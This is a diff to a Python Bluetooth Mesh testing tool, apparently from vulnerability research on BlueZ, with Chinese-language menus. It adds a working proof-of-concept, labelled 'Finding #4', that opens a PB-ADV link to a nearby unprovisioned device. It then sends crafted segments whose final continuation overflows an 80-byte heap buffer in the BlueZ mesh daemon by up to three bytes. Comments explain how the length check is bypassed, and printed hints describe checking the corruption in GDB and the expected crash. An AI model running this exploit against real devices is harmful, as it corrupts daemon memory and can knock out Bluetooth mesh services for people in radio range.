@@ -1,10 +1,12 @@
 import asyncio
 import logging
+import random
 import sys
 from typing import Dict, List
 from bumble.device import Device
 from bumble.transport import open_transport
 from bumble_mesh.stack import MeshStack
+from bumble_mesh.pb_adv import PBAdvLink
 from bumble_mesh.logger import setup_logging
 
 # 初始化全局日志配置
@@ -64,12 +66,13 @@ class MeshManager:
             print("  12. 发送自定义 SAR PDU (Custom SAR PDU)")
             print("  13. 发送错误自定义 SAR PDU (Malicious SAR PDU)")
             print("  14. 触发 Off-by-one 溢出 (Finding #2)")
+            print("  15. 触发 PB-ADV 续段堆溢出 (Finding #4)")
 
             print("\n --- 其他 ---")
-            print("  15. 退出 (Quit)")
+            print("  16. 退出 (Quit)")
             print("-" * 45)
             
-            choice = await asyncio.to_thread(input, "请选择操作 [1-15]: ")
+            choice = await asyncio.to_thread(input, "请选择操作 [1-16]: ")
             
             if choice == '1':
                 await self.scan_flow()
@@ -100,6 +103,8 @@ class MeshManager:
             elif choice == '14':
                 await self.off_by_one_flow()
             elif choice == '15':
+                await self.pb_adv_overflow_test()
+            elif choice == '16':
                 break
             else:
                 print("无效选择")
@@ -312,6 +317,114 @@ class MeshManager:
         print("[!]   sudo .venv/bin/python -m examples.exploit_off_by_one hci-socket:3")
         print("[!] 脚本会提示按 Enter 后发送 7 个 BLE 广播包")
         print("[!] 第 7 个包触发 off-by-one → scan->list[60]=0")
+
+    async def pb_adv_overflow_test(self):
+        """触发 Finding #4: PB-ADV 续段堆溢出 (sar[80] 写入 81-83 字节)"""
+        if not self.scanned_devices:
+            print("[-] 错误: 请先扫描设备 (选项1)")
+            return
+
+        # 选择设备
+        print("\n已扫描设备:")
+        dev_list = list(self.scanned_devices.items())
+        for i, (uid, info) in enumerate(dev_list):
+            print(f" [{i}] UUID: {uid} | RSSI: {info['rssi']}dBm")
+
+        idx_str = await asyncio.to_thread(input, "选择目标设备编号: ")
+        try:
+            idx = int(idx_str)
+            uuid = dev_list[idx][1]['uuid']
+        except (ValueError, IndexError):
+            print("无效编号")
+            return
+
+        # 溢出字节数
+        overflow_str = await asyncio.to_thread(
+            input, "溢出字节数 [1-3] (默认3): "
+        ) or "3"
+        try:
+            pad = int(overflow_str)
+            if pad < 1 or pad > 3:
+                pad = 3
+        except ValueError:
+            pad = 3
+
+        print(f"\n{'='*55}")
+        print(f"  Finding #4: PB-ADV 续段堆溢出测试")
+        print(f"  目标: {uuid.hex()}")
+        print(f"  溢出: {pad} 字节 (sar[80] → 写入 {80+pad} 字节)")
+        print(f"{'='*55}")
+
+        # 打开 PB-ADV 链路
+        link_id = random.getrandbits(32)
+        pb_link = PBAdvLink(
+            link_id,
+            lambda pdu: self.stack.bearer.send_pdu(pdu, is_pb_adv=True)
+        )
+
+        print("\n[*] 正在打开 PB-ADV 链路...")
+        try:
+            await pb_link.open(uuid, timeout=5.0)
+        except asyncio.TimeoutError:
+            print("[-] Link Open 超时！确认设备在范围内且未配网。")
+            return
+        print("[+] PB-ADV 链路已打开")
+
+        # 事务号：Link Open 用了 trans_num=0x00，我们用 0x01
+        trans_num = 0x01
+        link_bytes = link_id.to_bytes(4, 'big')
+
+        # --- 首段 (type & 0x03 == 0x00): exp_len=80, max_seg=3 ---
+        max_seg = 3
+        exp_len = 80
+        fcs = 0x00  # 不关心 FCS，溢出在 FCS 校验之前发生
+
+        seg0_data = exp_len.to_bytes(2, 'big') + bytes([fcs]) + b'\x00' * 20
+        gpc0 = (max_seg << 2) | 0x00  # start marker
+        seg0 = link_bytes + bytes([trans_num, gpc0]) + seg0_data
+
+        await self.stack.bearer.send_pdu(seg0, is_pb_adv=True)
+        print(f"[*] 首段已发送 (exp_len={exp_len}, max_seg={max_seg}, 含 {len(seg0_data)} 字节数据)")
+        await asyncio.sleep(0.15)
+
+        # --- 续段 1, 2 (type & 0x03 == 0x02): 每段 23 字节 ---
+        for i in range(1, 3):
+            gpc = (i << 2) | 0x02
+            seg = link_bytes + bytes([trans_num, gpc]) + b'\xCC' * 23
+            await self.stack.bearer.send_pdu(seg, is_pb_adv=True)
+            print(f"[*] 续段 {i} 已发送 (seg_idx={i}, offset={20 + (i-1)*23}, 23 字节)")
+            await asyncio.sleep(0.15)
+
+        # --- 续段 3: 溢出段！ ---
+        # offset = 20 + ((3-1)*23) = 66
+        # 正常应 14 字节 (80-66=14)，我们发 14+pad 字节
+        # 检查: 66 + (14+pad) - 3 = 77+pad
+        #   pad=1: 78 > 80? 否 → 通过。memcpy 写 81 字节 → 1 字节溢出
+        #   pad=2: 79 > 80? 否 → 通过。memcpy 写 82 字节 → 2 字节溢出
+        #   pad=3: 80 > 80? 否 → 通过。memcpy 写 83 字节 → 3 字节溢出
+        gpc3 = (3 << 2) | 0x02
+        overflow_len = 14 + pad
+        seg3 = link_bytes + bytes([trans_num, gpc3]) + b'\x41' * overflow_len
+        await self.stack.bearer.send_pdu(seg3, is_pb_adv=True)
+        print(f"[!!!] 续段 3 已发送 (seg_idx=3, offset=66, len={overflow_len}, 正常应为14)")
+        print(f"[!!!] memcpy(sar+66, data, {overflow_len}) → 写入 sar[66..{65+overflow_len}]")
+        print(f"[!!!] sar 缓冲区大小=80 → 溢出 {pad} 字节 (0x41) 到堆中")
+
+        await asyncio.sleep(0.5)
+
+        print(f"\n[+] 溢出触发完成。")
+        print(f"    sar[80] 位置写入: {b'\\x41' * pad!r}")
+        print(f"    检查 BlueZ 端:")
+        print(f"      - GDB: p/x ((struct pb_adv_session*)0x...)->sar 后内存")
+        print(f"      - 预期: sar[80..{79+pad}] 被 0x41 覆盖")
+        print(f"      - mesh daemon 可能因堆损坏而 crash 或行为异常")
+
+        # 关闭链路
+        try:
+            await pb_link.close()
+            print("[*] PB-ADV 链路已关闭")
+        except Exception:
+            pass
 
 
 async def main():
